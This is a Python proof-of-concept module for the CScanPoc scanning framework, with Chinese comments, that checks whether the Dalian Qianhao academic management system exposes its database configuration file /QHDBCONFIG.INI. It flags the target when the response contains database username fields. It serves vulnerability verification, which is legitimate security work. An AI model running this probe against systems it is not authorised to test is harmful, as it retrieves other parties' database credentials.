# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Dalianqianhao_0001'  # 平台漏洞编号，留空
    name = '大连乾豪综合教务管理系统信息泄漏'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-06-04'  # 漏洞公布时间
    desc = '''
        大连乾豪综合教务管理系统致力于高校信息化软件的研究与开发。目前在高校信息化方面已经形成了一套完整的信息化解决方案，本方案的目标是整合高校的管理数据和教学资源。
        大连乾豪综合教务管理系统信息泄漏:
        /QHDBCONFIG.INI
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=063453'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '乾豪综合教务管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'dec5f1ec-94a5-48a9-bd11-f6dc4753a026'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2010-063453
            payload = '/QHDBCONFIG.INI'
            target = self.target + payload
            #code, head, body, errcode, final_url = curl.curl2(target)
            r = requests.get(target)

            if r.status_code == 200 and 'DB_USERNAME=' in r.text:
                # security_warning(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
